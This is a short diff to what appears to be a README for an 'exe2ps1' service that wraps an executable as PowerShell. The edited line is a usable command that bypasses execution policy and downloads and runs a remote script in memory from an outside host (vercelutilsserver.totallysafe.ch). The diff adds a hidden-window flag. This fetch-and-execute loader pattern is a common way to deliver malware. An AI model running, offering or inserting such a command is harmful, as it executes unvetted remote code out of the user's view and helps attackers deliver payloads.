@@ -16,5 +16,5 @@ example: [`/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fp
 
 which can be executed with 
 ```shell
-powershell -ep ByPass "IEX(iwr('vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
+powershell -ep ByPass -w h "IEX(iwr('https://vercelutilsserver.totallysafe.ch/exe2ps1?url=https%3A%2F%2Fwww.python.org%2Fftp%2Fpython%2F3.12.4%2Fpython-3.12.4.exe'))"
 ```
